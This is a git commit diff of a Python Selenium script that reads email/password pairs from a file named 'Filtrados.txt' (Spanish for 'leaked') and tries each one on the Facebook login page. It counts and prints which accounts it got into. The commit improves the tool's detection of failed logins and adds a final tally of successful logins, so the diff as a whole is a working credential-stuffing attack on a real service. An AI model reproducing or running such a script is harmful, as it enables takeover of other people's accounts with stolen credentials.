9e8cefdb30be8dbe63aa9cbe1b70037802f04164
Javier Guerrero <[javier.guerrero1@mail.udp.cl]>
2022-05-07 18:53:11 -0400

    Final

--- Dust2Login.py
+++ Dust2Login.py
@@ -1,3 +1,4 @@
+from distutils.log import Log
 from lib2to3.pgen2 import driver
 from time import sleep
 from xml.dom.minidom import Element
@@ -5,7 +6,7 @@ from selenium import webdriver
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
+from selenium.common.exceptions import NoSuchElementException
 
 BD = open("Filtrados.txt","r").read()
 lines = BD.splitlines()
@@ -22,8 +23,12 @@ for i in range(0,len(lines),2):
     driver.find_element(By.XPATH,"//*[@id='email']").send_keys(email)
     driver.find_element(By.XPATH,"//*[@id='pass']").send_keys(psw)
     driver.find_element(By.NAME,"login").click()
-
-    if driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div[1]/div/div/div[1]/div/div/div[1]/ul/li/div/a"):
+    Login = True
+    try: 
+        driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div[1]/div/div/div[1]/div/div/div[1]/ul/li/div/a")
+    except NoSuchElementException:
+        Login = False
+    if Login:
         LoginSuccess+=1
         print("Inicio de Sesion logrado con: ",email)
         driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[2]/div[4]/div[1]/span/div/div[1]/svg").click()
@@ -31,6 +36,7 @@ for i in range(0,len(lines),2):
         driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[2]/div[4]/div[2]/div/div[2]/div[1]/div[1]/div/div/div/div/div/div/div/div/div[1]/div/div/div[1]/div[3]/div/div[4]/div/div[1]/div[2]/div/div/div/div/span").click()
 
     else:
-        print("F con: ",email)
-
+        print("No se logro en login con: ",email)
+        driver.get("https://www.facebook.com/")
+print("Se lograron ",LoginSuccess," inicios de sesion exitosos.")
 driver.quit()
